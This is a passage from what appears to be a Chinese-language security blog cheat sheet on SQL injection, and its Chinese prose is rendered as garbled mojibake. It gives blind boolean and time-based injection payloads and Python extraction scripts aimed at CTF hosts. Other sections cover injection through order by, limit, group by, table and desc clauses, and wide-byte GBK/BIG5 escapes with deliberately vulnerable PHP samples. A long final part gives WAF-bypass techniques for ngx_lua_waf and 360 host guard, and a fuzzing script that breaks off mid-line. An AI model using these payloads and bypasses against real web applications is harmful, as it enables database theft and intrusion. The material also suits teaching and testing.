class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or length((database()))&lt;8#</span><br><span class="line">*&apos; or ascii(substring((database()),1,1))=100# çŒœæµ‹å­—æ®µ</span><br></pre></td></tr></table></figure><p>ç»™å‡ºexpæ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'</span></span><br><span class="line">payload = <span class="string">'id=0 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))&lt;&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select database()',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))</span></span><br><span class="line">        hh = payload.format(sql=<span class="string">'select * from words.f14g'</span>,list=str(i),num=str(j))</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        zz = requests.get(url+hh)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello Hacker!!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><p>é‚£ä¹ˆè‹¥çŒœæµ‹å­—æ®µæ­£ç¡®ï¼Œé‚£ä¹ˆç°åœ¨å»¶è¿Ÿä¸€æ®µæ—¶é—´åå†è¿”å›ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or if(ascii(substring((database()),1,1))=116, sleep(100), 1);</span><br></pre></td></tr></table></figure><p>ç»™å‡ºexpæ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–ç”¨åˆ°çš„å‡½æ•°-å…³é”®å­—"><a href="#å…¶ä»–ç”¨åˆ°çš„å‡½æ•°-å…³é”®å­—" class="headerlink" title="å…¶ä»–ç”¨åˆ°çš„å‡½æ•°/å…³é”®å­—"></a>å…¶ä»–ç”¨åˆ°çš„å‡½æ•°/å…³é”®å­—</h3><ul><li><p>regexp binary </p><p><code>and password regexp binary â€˜^Aâ€™#</code></p></li><li><p>mid() åŒsubstr</p><p><code>MID(version(),1,1)</code></p></li><li><p>ord() åŒascii</p></li></ul><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>ä½¿ç”¨<code>;</code>ç»“æŸä¸Šä¸€å¥æŸ¥è¯¢è¯­å¥åå†æ‰§è¡Œå¦ä¸€æ¡è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM test;select if(1=1,SLEEP(100),1);</span><br></pre></td></tr></table></figure><h1 id="éwhereçš„æ³¨å…¥ç‚¹"><a href="#éwhereçš„æ³¨å…¥ç‚¹" class="headerlink" title="éwhereçš„æ³¨å…¥ç‚¹"></a>éwhereçš„æ³¨å…¥ç‚¹</h1><h2 id="order-byæ³¨å…¥ç‚¹"><a href="#order-byæ³¨å…¥ç‚¹" class="headerlink" title="order byæ³¨å…¥ç‚¹"></a>order byæ³¨å…¥ç‚¹</h2><ul><li><p>Error Based</p><p><code>order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))</code></p></li><li><p>Time Based #5.5å¤ç°å¤±è´¥</p><p><code>order by if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code></p></li><li><p>Bool Based</p><p><code>order by (select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00))</code> </p></li></ul><h2 id="limitæ³¨å…¥ç‚¹"><a href="#limitæ³¨å…¥ç‚¹" class="headerlink" title="limitæ³¨å…¥ç‚¹"></a>limitæ³¨å…¥ç‚¹</h2><ul><li><code>limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1)</code></li></ul><h2 id="group-byæ³¨å…¥ç‚¹"><a href="#group-byæ³¨å…¥ç‚¹" class="headerlink" title="group byæ³¨å…¥ç‚¹"></a>group byæ³¨å…¥ç‚¹</h2><p><code>GROUP BY if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test));</code></p><h2 id="tableæ³¨å…¥ç‚¹"><a href="#tableæ³¨å…¥ç‚¹" class="headerlink" title="tableæ³¨å…¥ç‚¹"></a>tableæ³¨å…¥ç‚¹</h2><p><code>users where updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#</code></p><h2 id="descæ³¨å…¥ç‚¹"><a href="#descæ³¨å…¥ç‚¹" class="headerlink" title="descæ³¨å…¥ç‚¹"></a>descæ³¨å…¥ç‚¹</h2><p>descä¸å®Œå…¨å¯æ§å’Œtableç»“åˆï¼Œéœ€è¦ä¿è¯descæˆåŠŸï¼ŒtableæŠ¥é”™ï¼Œåªæœ‰åœ¨descå’Œtableåªèƒ½æœ‰ä¸€ä¸ªå«â€&#96;â€æ—¶èƒ½æ³¨å…¥ï¼ˆéƒ½å«æœ‰æˆ–éƒ½ä¸å«æœ‰åˆ™æ— è§£ï¼‰<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"xiaoyu"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC å‡ºé”™:"</span>.mysql_error()); <span class="comment">//è¡¨åä¸å®Œå…¨å¯æ§</span></span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?table=users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#</span><br><span class="line"></span><br><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</span><br></pre></td></tr></table></figure><h1 id="like-æ³¨å…¥ç‚¹"><a href="#like-æ³¨å…¥ç‚¹" class="headerlink" title="like æ³¨å…¥ç‚¹"></a>like æ³¨å…¥ç‚¹</h1><p>ä¸whereæ³¨å…¥ç±»ä¼¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx' and '1'=updatexml(1,concat(0x7e,(<span class="keyword">select</span> SCHEMA_NAME <span class="keyword">from</span> information_schema.SCHEMATA <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>å³ä½¿è¾“å…¥æ—¶ä½¿ç”¨äº†addslashesè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯MySQLçš„å®¢æˆ·ç«¯å­—ç¬¦é›†ï¼ˆcharacter_set_clientï¼‰è®¾ç½®ä¸ºGBKã€BIG5æˆ–å…¶ä»–ï¼Œå¯¼è‡´<code>/</code>åœ¨è§£ç æ—¶è¢«è·³è„±ï¼Œä¾‹å¦‚æœ‰å¦‚ä¸‹ç¨‹åºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$name=addslashes($name); <span class="comment">//nameè¢«è½¬ä¹‰</span></span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line">$result=mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadä¸º<code>?name=admin%df%27%20union%20select%201,2%20%23</code></p><p>ç¼–ç è¿‡ç¨‹<br><code>1&#39; ==addslashes==&gt; 1\&#39; (1\x5c\x27)</code><br><code>1%df&#39; ==addslashes==&gt; 1%df\&#39;(1\xdf\x5c\x27) ==encode(gbk)==&gt; 1é‹&#39;</code>     #<code>&#39;</code>é€ƒé€¸</p><h2 id="iconvè½¬æ¢æƒ…å†µ"><a href="#iconvè½¬æ¢æƒ…å†µ" class="headerlink" title="iconvè½¬æ¢æƒ…å†µ"></a>iconvè½¬æ¢æƒ…å†µ</h2><p>gbkç¼–ç è½¬æ¢æˆutf8æ—¶ï¼Œè½¬æ¢æ—¶ä¹Ÿä¼šå¼•å‘é”™è¯¯ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">mysql_query(<span class="string">"set names UTF-8"</span>) ;</span><br><span class="line">$bar =iconv(<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>, addslashes($name));</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>payloadä¸º<code>admin%e5%5c%27%20union%20select%201,2%20%23</code>(<code>admin%e5\&#39; union select 1,2 #</code>)</p><p>ç¼–ç è¿‡ç¨‹ï¼ˆç”±äº<code>\xe5\x5c</code>è½¬ä¸ºUTF-8ä¸º<code>\xe9\x8c\xa6</code>ï¼‰ï¼š</p><p><code>%e5\&#39; (\xe5\x5c\x27) ==addslashes==&gt; %e5\\\&#39; (\xe5\x5c\x5c\x5c\x27) ==iconv==&gt; \xe9\x8c\xa6\x5c\x5c\x27</code></p><p>å¦å¤–ï¼Œè‹¥ç¼–ç ä¸ºBIG5æ—¶ï¼Œpayloadä¸º<code>1å…\&#39; =&gt; 1\xa2\x5c\x5c\x27 =&gt; 1?\\&#39;</code>ã€‚</p><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><ul><li><p>æ¢ç”¨utf8å­—ç¬¦é›†</p></li><li><p>ä½¿ç”¨mysql_set_charset()è®¾ç½®å­—ç¬¦é›†å¹¶ä¸”ä½¿ç”¨mysql_real_escape_string()è½¬ä¹‰ï¼Œå…¶ä¼šè€ƒè™‘å½“å‰å­—ç¬¦é›†æ‰€ä»¥ä¸ä¼šäº§ç”Ÿé€ƒé€¸é—®é¢˜ï¼š</p><p><code>mysql_set_charset(&#39;gbk&#39;);$name=mysql_real_escape_string($name);</code></p></li></ul><h1 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h1><h2 id="ç»•è¿‡å­—ç¬¦"><a href="#ç»•è¿‡å­—ç¬¦" class="headerlink" title="ç»•è¿‡å­—ç¬¦"></a>ç»•è¿‡å­—ç¬¦</h2><ul><li><p>ç»•è¿‡ç©ºæ ¼</p><ul><li>%0a(<code>\r</code>)ã€%0b(<code>\t</code>)ã€%a0(+)</li></ul></li><li><p>ç»•è¿‡å•å¼•å·</p><ul><li>ç¼–ç ï¼šUnicodeï¼ˆIISæ”¯æŒï¼‰ã€Hex</li><li>å‡½æ•°ï¼šchar</li><li>å®½å­—èŠ‚</li><li>æ•°å­—å‹</li></ul></li><li><p>ç»•è¿‡union</p><ul><li>ä½¿ç”¨ç›²æ³¨</li></ul></li><li><p>ç»•è¿‡and/or</p><ul><li>&amp;&amp; / ||</li></ul></li><li><p>substring()</p><ul><li>mid() left() right()</li></ul></li><li><p>ç»•è¿‡å°æ‹¬å·</p><ul><li><code>?username=admin&#39; and password binary regexp &#39;^A&#39;</code></li></ul></li></ul><h2 id="ç»•è¿‡ngx-lua-waf"><a href="#ç»•è¿‡ngx-lua-waf" class="headerlink" title="ç»•è¿‡ngx_lua_waf"></a>ç»•è¿‡ngx_lua_waf</h2><p>è¯¦ç»†è¯·å‚è€ƒ<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">Bypass ngx_lua_waf SQLæ³¨å…¥é˜²å¾¡ï¼ˆå¤šå§¿åŠ¿ï¼‰</a></p><h3 id="HTTP-å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰"><a href="#HTTP-å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰" class="headerlink" title="HTTP å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰"></a>HTTP å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.147/test/sql.aspx</span><br><span class="line">?id=1 UNION/&amp;ID=/SELECT null,name,null/&amp;Id=/FROM master.dbo.sysdatabases</span><br></pre></td></tr></table></figure><h3 id="URIå‚æ•°æº¢å‡º"><a href="#URIå‚æ•°æº¢å‡º" class="headerlink" title="URIå‚æ•°æº¢å‡º"></a>URIå‚æ•°æº¢å‡º</h3><p>æäº¤100ä¸ªä»¥ä¸Šå‚æ•°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.php</span><br><span class="line"></span><br><span class="line">POSTï¼šid=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp; id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/*!from*/information_schema.SCHEMATA</span><br></pre></td></tr></table></figure></p><p>MSSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.aspx</span><br><span class="line"></span><br><span class="line">POSTï¼šid=1/*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*/ union select null,table_name,null from INFOMATION_SCHEMA.tables</span><br></pre></td></tr></table></figure></p><h2 id="ç»•è¿‡360ä¸»æœºå«å£«"><a href="#ç»•è¿‡360ä¸»æœºå«å£«" class="headerlink" title="ç»•è¿‡360ä¸»æœºå«å£«"></a>ç»•è¿‡360ä¸»æœºå«å£«</h2><p>è¯¦ç»†è¯·å‚è€ƒ<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">Bypass 360ä¸»æœºå«å£«SQLæ³¨å…¥é˜²å¾¡ï¼ˆå¤šå§¿åŠ¿ï¼‰</a></p><h3 id="åˆ©ç”¨é»˜è®¤ç™½åå•"><a href="#åˆ©ç”¨é»˜è®¤ç™½åå•" class="headerlink" title="åˆ©ç”¨é»˜è®¤ç™½åå•"></a>åˆ©ç”¨é»˜è®¤ç™½åå•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨é™æ€èµ„æº"><a href="#åˆ©ç”¨é™æ€èµ„æº" class="headerlink" title="åˆ©ç”¨é™æ€èµ„æº"></a>åˆ©ç”¨é™æ€èµ„æº</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="ç¼“å†²åŒºæº¢å‡º"><a href="#ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="ç¼“å†²åŒºæº¢å‡º"></a>ç¼“å†²åŒºæº¢å‡º</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="URIå‚æ•°æº¢å‡º-1"><a href="#URIå‚æ•°æº¢å‡º-1" class="headerlink" title="URIå‚æ•°æº¢å‡º"></a>URIå‚æ•°æº¢å‡º</h3><p>åŒngx_lua_waf</p><h3 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a>GET+POST</h3><p>æäº¤POSTè¯·æ±‚æ—¶ï¼Œå¿½ç•¥GETè¯·æ±‚ä¸­çš„å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union select 1,column_name,3 from information_schema.columns</span><br><span class="line"></span><br><span class="line">POSTï¼šaaa</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line">1 union /*!select*/ 1,2,schema_name</span><br><span class="line">from information_schema.SCHEMATA</span><br><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM--</span><br></pre></td></tr></table></figure><h3 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h3><p>ç›´æ¥ç”¨fuzzè„šæœ¬ï¼Œç»“åˆæ³¨é‡Šã€ç©ºæ ¼ç»•è¿‡å’Œ<code>/*!*/</code>è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://test.com/index.php?id=1"</span></span><br><span class="line">Fuzz_a = [ <span class="string">'/*!'</span>, <span class="string">'*/'</span>, <span class="string">'/**/'</span>, <span class="string">'/'</span>, <span class="string">'?'</span>, <span class="string">'~'</span>, <span class="string">'!'</span>, <span class="string">'.'</span>, <span class="string">'%'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">'='</span>]</span><br><span class="line">Fuzz_b = [<span class="string">''</span>]</span><br><span class="line">Fuzz_c = [<span class="string">'%0a'</span>, <span class="string">'%0b'</span>, <span class="string">'%0c'</span>, <span class="string">'%0d'</span>, <span class="string">'%0e'</span>, <span class="string">'%0f'</span>, <span class="string">'%0h'</span>, <span class="string">'%0i'</span>, <span class="string">'%0j'</span>]</span><br><span class="line">FUZZ = Fuzz_a + Fuzz_b + Fuzz_c</span><br><span class="line"><span class="comment"># é…ç½®fuzzå­—å…¸</span></span><br><span class="line">header = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>&#125;</span><br><span class="line">sql=<span class="string">'union select SCHEMA_NAME,2 from 